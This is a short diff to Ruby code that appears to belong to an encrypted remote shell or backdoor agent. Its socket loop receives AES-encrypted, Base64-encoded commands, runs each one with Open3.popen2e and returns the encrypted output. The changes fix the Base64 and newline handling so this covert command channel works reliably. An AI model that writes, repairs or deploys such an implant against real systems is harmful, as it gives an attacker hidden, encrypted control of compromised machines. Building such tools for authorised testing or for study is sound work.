@@ -9,7 +9,7 @@ def encrypt(command)
   @aes.key = @key
   #aes.iv = iv
   encrypted_data = @aes.update(command) + @aes.final
-  encoded_command = Base64.encode64(encrypted_data)
+  encoded_command = Base64.strict_encode64(encrypted_data)
   return encoded_command
 end
 def decrypt(command)
@@ -17,14 +17,14 @@ def decrypt(command)
   @aes.key = @key
   #aes.iv = iv
   base64_data = command
-  decode_data = Base64.decode64(base64_data)
+  decode_data = Base64.strict_decode64(base64_data)
   decrypt_data = @aes.update(decode_data) + @aes.final
   return decrypt_data
 end
 def command_loop(socket)
   loop {
     command = socket.gets
-    decypt_command = decrypt(command)
+    decypt_command = decrypt(command.chomp)
     decypt_command = decypt_command.chomp
     exit if decypt_command == 'exit'
     shell_command, *arguments = Shellwords.shellsplit(decypt_command)
@@ -33,11 +33,6 @@ def command_loop(socket)
       socket.print("#{Dir.pwd}\n")
     else
       stdin, stdout_and_stderr = Open3.popen2e("#{decypt_command}")
-      #puts stdout_and_stderr.readlines
-      #command_array = []
-      #command_array << stdout_and_stderr.readlines.join.chomp
-      #encrypted_command = encrypt(command_array.to_s)
-      #print encrypted_command
       encrypted_command = encrypt(stdout_and_stderr.readlines.join.chomp)
       socket.print("#{encrypted_command}\n")
     end
